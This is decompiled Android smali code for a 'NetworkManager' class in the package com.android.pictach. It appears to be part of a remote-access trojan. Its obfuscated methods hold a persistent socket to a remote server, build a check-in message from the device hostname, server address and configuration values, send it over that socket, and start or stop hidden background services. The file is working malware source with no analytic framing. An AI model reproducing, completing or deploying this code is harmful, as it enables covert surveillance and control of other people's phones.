.class public Lcom/android/pictach/NetworkManager;
.super Ljava/lang/Object;
.source "xxgzazaf.java"
# optimised-96373
# ep-poefgimjffcl


# static fields
.field public static T_NetworkManager_2:Ljava/lang/String; = null

.field public static T_NetworkManager_3:Ljava/lang/String; = null

.field public static T_NetworkManager_4:Ljava/lang/String; = null

.field public static T_NetworkManager_5:Ljava/lang/String; = null

.field public static T_NetworkManager_6:Ljava/lang/String; = null

.field public static T_NetworkManager_7:Ljava/lang/String; = null

.field public static adre_NetworkManager_sses:Ljava/net/InetAddress; = null

.field public static ctx:Landroid/content/Context; = null

.field public static da_NetworkManager_da:Ljava/lang/String; = null

.field public static ec_NetworkManager_ho:Z = false

.field public static fa__NetworkManager_da:Ljava/lang/String; = null

.field public static inputnew:Ljava/io/DataInputStream; = null

.field public static outpu_NetworkManager_tnew:Ljava/io/OutputStream; = null

.field public static q:Z = false

.field public static r:Ljava/lang/Object; = null

.field public static rec_NetworkManager_iver:Ljava/net/Socket; = null

.field public static s_NetworkManager_s:J = 0xfaL

.field public static sca_NetworkManager_drees:Ljava/net/InetSocketAddress; = null

.field public static final t_NetworkManager_t:I = 0xafc8

.field public static final u_NetworkManager_u:I = 0x32000

.field public static y:Ljava/lang/Object;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 23
    new-instance v0, Ljava/lang/Object;

    invoke-direct {v0}, Ljava/lang/Object;-><init>()V

    sput-object v0, Lcom/android/pictach/NetworkManager;->y:Ljava/lang/Object;

    .line 24
    new-instance v0, Ljava/lang/Object;

    invoke-direct {v0}, Ljava/lang/Object;-><init>()V

    sput-object v0, Lcom/android/pictach/NetworkManager;->r:Ljava/lang/Object;

    const-string v0, "CRAZY"

    .line 28
    sput-object v0, Lcom/android/pictach/NetworkManager;->T_NetworkManager_2:Ljava/lang/String;

    .line 29
    sput-object v0, Lcom/android/pictach/NetworkManager;->T_NetworkManager_3:Ljava/lang/String;

    .line 30
    sput-object v0, Lcom/android/pictach/NetworkManager;->T_NetworkManager_4:Ljava/lang/String;

    .line 31
    sput-object v0, Lcom/android/pictach/NetworkManager;->T_NetworkManager_5:Ljava/lang/String;

    .line 32
    sput-object v0, Lcom/android/pictach/NetworkManager;->T_NetworkManager_6:Ljava/lang/String;

    .line 33
    sput-object v0, Lcom/android/pictach/NetworkManager;->T_NetworkManager_7:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 13
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static CLOSEALLINTENT(Ljava/lang/String;)V
    .locals 2

    const/4 p0, 0x0

    .line 252
    sput-boolean p0, Lcom/android/pictach/love;->k:Z

    .line 253
    sput-boolean p0, Lcom/android/pictach/NetworkManager;->q:Z

    .line 255
    :try_start_0
    sget-object p0, Lcom/android/pictach/NetworkManager;->rec_NetworkManager_iver:Ljava/net/Socket;

    invoke-virtual {p0}, Ljava/net/Socket;->shutdownInput()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 261
    :catch_0
    :try_start_1
    sget-object p0, Lcom/android/pictach/NetworkManager;->rec_NetworkManager_iver:Ljava/net/Socket;

    invoke-virtual {p0}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object p0

    invoke-virtual {p0}, Ljava/io/OutputStream;->close()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 264
    :catch_1
    :try_start_2
    sget-object p0, Lcom/android/pictach/NetworkManager;->rec_NetworkManager_iver:Ljava/net/Socket;

    invoke-virtual {p0}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object p0

    invoke-virtual {p0}, Ljava/io/InputStream;->close()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    .line 267
    :catch_2
    :try_start_3
    sget-object p0, Lcom/android/pictach/NetworkManager;->rec_NetworkManager_iver:Ljava/net/Socket;

    invoke-virtual {p0}, Ljava/net/Socket;->close()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    goto :goto_0

    :catch_3
    nop

    .line 269
    :goto_0
    sget-object p0, Lcom/android/pictach/NetworkManager;->outpu_NetworkManager_tnew:Ljava/io/OutputStream;

    const/4 v0, 0x0

    if-eqz p0, :cond_0

    .line 272
    :try_start_4
    invoke-virtual {p0}, Ljava/io/OutputStream;->close()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_4

    .line 274
    :catch_4
    sput-object v0, Lcom/android/pictach/NetworkManager;->outpu_NetworkManager_tnew:Ljava/io/OutputStream;

    .line 276
    :cond_0
    sget-object p0, Lcom/android/pictach/NetworkManager;->inputnew:Ljava/io/DataInputStream;

    if-eqz p0, :cond_1

    .line 279
    :try_start_5
    invoke-virtual {p0}, Ljava/io/DataInputStream;->close()V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_5

    .line 281
    :catch_5
    sput-object v0, Lcom/android/pictach/NetworkManager;->inputnew:Ljava/io/DataInputStream;

    .line 283
    :cond_1
    const-class p0, Lcom/android/pictach/com;

    sget-object v0, Lcom/android/pictach/NetworkManager;->ctx:Landroid/content/Context;

    invoke-static {p0, v0}, Lcom/android/pictach/LoveApi0;->illacarterithomsonwtranskschemeijohnstontscreeningnglennomaybehoptimizeelikelyfcopxchallengeh49(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result p0

    if-nez p0, :cond_2

    .line 284
    new-instance p0, Landroid/content/Intent;

    sget-object v0, Lcom/android/pictach/NetworkManager;->ctx:Landroid/content/Context;

    const-class v1, Lcom/android/pictach/com;

    invoke-direct {p0, v0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 286
    sget-object v0, Lcom/android/pictach/NetworkManager;->ctx:Landroid/content/Context;

    invoke-virtual {v0, p0}, Landroid/content/Context;->stopService(Landroid/content/Intent;)Z

    .line 288
    :cond_2
    const-class p0, Lcom/android/pictach/video;

    sget-object v0, Lcom/android/pictach/NetworkManager;->ctx:Landroid/content/Context;

    invoke-static {p0, v0}, Lcom/android/pictach/LoveApi0;->illacarterithomsonwtranskschemeijohnstontscreeningnglennomaybehoptimizeelikelyfcopxchallengeh49(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result p0

    if-nez p0, :cond_3

    .line 289
    new-instance p0, Landroid/content/Intent;

    sget-object v0, Lcom/android/pictach/NetworkManager;->ctx:Landroid/content/Context;

    const-class v1, Lcom/android/pictach/video;

    invoke-direct {p0, v0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 290
    sget-object v0, Lcom/android/pictach/NetworkManager;->ctx:Landroid/content/Context;

    invoke-virtual {v0, p0}, Landroid/content/Context;->stopService(Landroid/content/Intent;)Z

    :cond_3
    return-void
.end method

.method public static fundamentalgseedsbperiodicrshoreabaconaillustratedlshtleadnfeedrmodelsrsieomllzoophiliayminimized46(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
    .locals 0

    .line 199
    sput-object p2, Lcom/android/pictach/NetworkManager;->ctx:Landroid/content/Context;

    .line 200
    sput-object p0, Lcom/android/pictach/NetworkManager;->da_NetworkManager_da:Ljava/lang/String;

    .line 201
    sput-object p1, Lcom/android/pictach/NetworkManager;->fa__NetworkManager_da:Ljava/lang/String;

    .line 202
    invoke-static {p0, p1}, Lcom/android/pictach/NetworkManager;->zonesdregistrarddawngagreementsforestryeconventionsystepclimitsicloudsjenginesoslideshowosubn44(Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method

.method public static laughhbarbadosestrictlyoquantumjslopeksailtsubmittedtcontrollersqhelicoptercheatermculturalv45(Ljava/lang/String;)V
    .locals 3

    .line 92
    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result p0

    if-lez p0, :cond_0

    const-string p0, "CRAZYCRAZYCRAZYCRAZYCRAZYCRAZYCRAZY"

    .line 98
    :try_start_0
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v1, Lcom/android/pictach/NetworkManager;->sca_NetworkManager_drees:Ljava/net/InetSocketAddress;

    invoke-virtual {v1}, Ljava/net/InetSocketAddress;->getAddress()Ljava/net/InetAddress;

    move-result-object v1

    invoke-virtual {v1}, Ljava/net/InetAddress;->getHostAddress()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lcom/android/pictach/Utils;->t_Utils_g:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lcom/android/pictach/NetworkManager;->sca_NetworkManager_drees:Ljava/net/InetSocketAddress;

    .line 99
    invoke-virtual {v1}, Ljava/net/InetSocketAddress;->getPort()I

    move-result v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    sget-object v1, Lcom/android/pictach/Utils;->t_Utils_g:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lcom/android/pictach/Config;->FTX0:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lcom/android/pictach/Utils;->t_Utils_g:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lcom/android/pictach/Config;->FTX1:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lcom/android/pictach/Utils;->t_Utils_g:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lcom/android/pictach/Config;->FTX2:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lcom/android/pictach/Utils;->t_Utils_g:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lcom/android/pictach/Config;->FTX3:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lcom/android/pictach/Utils;->t_Utils_g:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lcom/android/pictach/NetworkManager;->adre_NetworkManager_sses:Ljava/net/InetAddress;

    .line 104
    invoke-virtual {v1}, Ljava/net/InetAddress;->getHostName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lcom/android/pictach/Utils;->t_Utils_g:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lcom/android/pictach/NetworkManager;->ctx:Landroid/content/Context;

    .line 105
    invoke-virtual {v1}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v1

    const v2, 0x7f090014

    invoke-virtual {v1, v2}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lcom/android/pictach/Utils;->t_Utils_g:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, "[CR]"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lcom/android/pictach/Utils;->t_Utils_g:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 108
    sget v1, Lcom/android/pictach/love;->p_love_lg:I

    invoke-static {v1}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    invoke-virtual {v0, p0, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {p0}, Ljava/lang/String;->getBytes()[B

    move-result-object p0

    invoke-static {v1, p0}, Lcom/android/pictach/NetworkManager;->locatevlibertyqlightsqfacestlaboratoriesxelliottdwhereasjsitemaphbennettiratiohlehabortionq47(Ljava/lang/String;[B)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_0
    return-void
.end method

.method public static locatevlibertyqlightsqfacestlaboratoriesxelliottdwhereasjsitemaphbennettiratiohlehabortionq47(Ljava/lang/String;[B)V
    .locals 2

    .line 207
    :try_start_0
    sget-object v0, Lcom/android/pictach/Utils;->e_Utils_xc:Ljava/util/concurrent/Executor;

    check-cast v0, Ljava/util/concurrent/ThreadPoolExecutor;

    invoke-virtual {v0}, Ljava/util/concurrent/ThreadPoolExecutor;->getActiveCount()I

    move-result v0

    sget v1, Lcom/android/pictach/Utils;->m_Utils_ax:I

    if-lt v0, v1, :cond_0

    return-void

    .line 210
    :cond_0
    sget-object v0, Lcom/android/pictach/Utils;->e_Utils_xc:Ljava/util/concurrent/Executor;

    new-instance v1, Lcom/android/pictach/NetworkManager$3;

    invoke-direct {v1, p0, p1}, Lcom/android/pictach/NetworkManager$3;-><init>(Ljava/lang/String;[B)V

    invoke-interface {v0, v1}, Ljava/util/concurrent/Executor;->execute(Ljava/lang/Runnable;)V
    :try_end_0
    .catch Ljava/lang/NullPointerException; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method

.method public static ox()V
    .locals 3

    .line 236
    :try_start_0
    sget v0, Lcom/android/pictach/love;->p_love_lg:I

    const/4 v1, -0x1

    if-eq v0, v1, :cond_0

    .line 237
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v1, Lcom/android/pictach/love;->c_love_mn:[Ljava/lang/String;

    const/4 v2, 0x0

    aget-object v1, v1, v2

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lcom/android/pictach/NetworkManager;->adre_NetworkManager_sses:Ljava/net/InetAddress;

    invoke-virtual {v1}, Ljava/net/InetAddress;->getHostName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/android/pictach/Utils;->e_Utils_cx(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_0
    return-void
.end method

.method public static r_NetworkManager_cv()V
    .locals 2

    .line 116
    :try_start_0
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/android/pictach/NetworkManager$2;

    invoke-direct {v1}, Lcom/android/pictach/NetworkManager$2;-><init>()V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 195
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method

.method public static zonesdregistrarddawngagreementsforestryeconventionsystepclimitsicloudsjenginesoslideshowosubn44(Ljava/lang/String;Ljava/lang/String;)V
    .locals 2

    .line 35
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/android/pictach/NetworkManager$1;

    invoke-direct {v1, p0, p1}, Lcom/android/pictach/NetworkManager$1;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 88
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method
